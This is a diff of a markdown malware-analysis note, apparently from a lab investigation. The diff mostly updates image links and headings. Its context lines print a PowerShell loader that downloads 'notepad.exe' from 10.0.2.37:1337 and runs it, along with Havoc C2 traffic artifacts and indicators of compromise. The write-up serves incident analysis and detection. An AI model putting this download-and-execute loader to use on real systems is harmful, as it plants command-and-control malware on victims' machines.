@@ -1,7 +1,5 @@
 - **install.ps1**
-
-![[../../Image/Pasted image 20250423091359.png]]
-
+![](../../Image/Pasted%20image%2020250423105618.png)
 ```
 $aysXS8Hlhf = "http://10.0.2.37:1337/notepad.exe";
 $LA4rJgSPpx = "C:\Users\paco\Downloads\notepad.exe";
@@ -9,10 +7,13 @@ Invoke-WebRequest -Uri $aysXS8Hlhf -OutFile $LA4rJgSPpx;
 $65lmAtnzW8 = New-ObjectSystem.Net.WebClient;$65lmAtnzW8.DownloadFile($aysXS8Hlhf, $LA4rJgSPpx);
 Start-Process -Filepath $LA4rJgSPpx
 ```
+
 - **Object list:**
-![[../../Image/Pasted image 20250423095009.png]]
+![](../../Image/Pasted%20image%2020250423105656.png)
+
 - **notepad.exe**
-![[../../Image/Pasted image 20250423100437.png]]
+![](../../Image/Pasted%20image%2020250423105643.png)
+
 - **Havoc Artifact** from network traffic
 ```
 [+] Parsing Request
@@ -25,9 +26,9 @@ Start-Process -Filepath $LA4rJgSPpx
     [-] IV: 8cd00c3e349290565aaa5a8c3aacd430
 ```
 ## IOCs
-#### **IP Address:**
+#### **IP Address**
 - hxxp[:]//10.0.2.37
-#### **File:**
+#### **File**
 - /install.ps1
 - /notepad.exe
 - /notepad.exe
